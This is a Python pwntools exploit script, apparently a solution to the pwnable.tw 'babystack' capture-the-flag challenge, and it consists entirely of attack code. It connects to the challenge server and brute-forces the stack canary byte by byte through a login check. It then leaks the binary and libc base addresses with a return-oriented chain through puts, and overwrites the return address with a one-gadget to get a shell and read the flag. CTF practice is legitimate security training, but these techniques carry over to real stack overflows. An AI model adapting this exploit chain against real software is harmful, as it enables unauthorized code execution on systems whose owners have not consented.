from pwn import *

e = ELF("./babystack")
libc = ELF("./libc_64.so.6")

#p = process(e.path, env={"LD_PRELOAD": libc.path})
p = remote("chall.pwnable.tw", 10205)

def leak(length=0x26):
  chk = ""
  while len(chk) != length:
    print("Bashed {}".format(len(chk)))
    for i in range(1, 256 + 1):
      if i == 10:
        continue
      if i == 256:
        print("Bad stack chk")
        exit()

      p.sendafter(">>", "1".ljust(0x10, "A"))
      p.sendlineafter(" :", chk + chr(i))

      if "Login Success" in p.recvline():
        chk += chr(i)
        p.sendlineafter(">>", "1")
        break
  return chk

chk = leak()
binary_base = u64(chk[0x20:].ljust(8, "\x00")) - 0x1060
print("Binary Base: {:#x}".format(binary_base))

p.sendlineafter(">>", "1")
p.sendlineafter(":", "\x00".ljust(0x40, "A") + chk[:0x10] + "A" * 0x10 + "A" * 8 + p64(binary_base + 0xca0))
p.sendlineafter(">>", "3")
p.sendafter(":", "A" * 0x3f)

p.sendlineafter(">>", "2")

p.sendline(p64(binary_base + 0x202100) * 4 + p64(binary_base + 0x10c3) + p64(binary_base + e.got["puts"]) + p64(binary_base + e.symbols["puts"]) + p64(binary_base + 0xecf))

libc_base = u64(p.recvline(keepends=False)[1:].ljust(8, "\x00")) - libc.symbols["puts"]
print("Libc Base: {:#x}".format(libc_base))

p.sendlineafter(">>", "1")


chk = leak(0x10)

p.sendlineafter(">>", "1")
p.sendlineafter(":", "\x00".ljust(0x40, "A") + chk[:0x10] + "A" * 0x10 + "A" * 8 + p64(libc_base + 0x45216))
p.sendlineafter(">>", "3")
p.sendafter(":", "A" * 0x3f)

p.sendlineafter(">>", "2")

p.sendline("cat /home/babystack/flag")

p.interactive()

